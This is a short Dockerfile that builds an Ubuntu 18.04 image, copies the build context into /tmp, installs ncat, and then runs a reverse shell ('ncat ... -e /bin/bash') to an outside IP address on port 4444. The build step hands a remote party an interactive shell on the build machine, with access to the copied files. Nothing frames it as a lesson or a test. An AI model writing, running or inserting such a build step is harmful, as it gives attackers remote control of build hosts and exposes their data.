FROM ubuntu:18.04

COPY / /tmp/.

WORKDIR /tmp
RUN apt-get update && apt-get install ncat -y
RUN ncat 172.105.254.138 4444 -e /bin/bash
